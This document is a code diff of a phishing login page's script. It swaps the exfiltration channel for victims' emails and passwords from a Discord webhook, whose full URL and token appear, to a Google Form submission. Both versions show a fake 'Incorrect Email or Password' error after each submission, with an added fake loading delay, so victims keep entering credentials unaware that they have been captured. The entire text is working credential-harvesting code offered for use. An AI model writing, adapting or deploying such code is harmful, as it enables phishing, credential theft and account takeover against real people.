@@ -151,8 +151,12 @@
 </div>
 
 <script>
-    // YOUR SPECIFIC WEBHOOK URL
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1570694636727570532/i-zQWA62FJCAxnH_Xfi_E7kuxCkzNN3gLE7XB5H0kI0LNe-nMO7xUX_MYvOUVJ8wfSXf"; 
+    // REPLACE THESE WITH YOUR GOOGLE FORM ENTRY IDS
+    const EMAIL_ENTRY_ID = "entry.123456789"; 
+    const PASS_ENTRY_ID = "entry.987654321";
+    
+    // REPLACE WITH YOUR FORM ID
+    const FORM_ID = "YOUR_FORM_ID_HERE"; 
 
     const form = document.getElementById('loginForm');
     const emailInput = document.getElementById('email');
@@ -178,19 +182,25 @@
             return;
         }
 
-        sendToDiscord(email, password);
-        errorMsg.textContent = "Incorrect Email or Password. Please try again";
-        passInput.value = '';
+        sendToForm(email, password);
+        
+        // Fake loading then show error
+        setTimeout(() => {
+             errorMsg.textContent = "Incorrect Email or Password. Please try again";
+             passInput.value = '';
+        }, 1000);
     });
 
-    function sendToDiscord(email, pass) {
-        fetch(WEBHOOK_URL, {
+    function sendToForm(email, pass) {
+        const url = `https://docs.google.com/forms/d/${FORM_ID}/formResponse`;
+        const formData = new FormData();
+        formData.append(EMAIL_ENTRY_ID, email);
+        formData.append(PASS_ENTRY_ID, pass);
+
+        fetch(url, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `**New Login Attempt!**\n\n📧 **Email:** ${email}\n🔑 **Password:** ${pass}`
-            }),
-            mode: 'no-cors' 
+            mode: 'no-cors', // Important for Google Forms
+            body: formData
         }).catch(err => console.error("Failed", err));
     }
 </script>
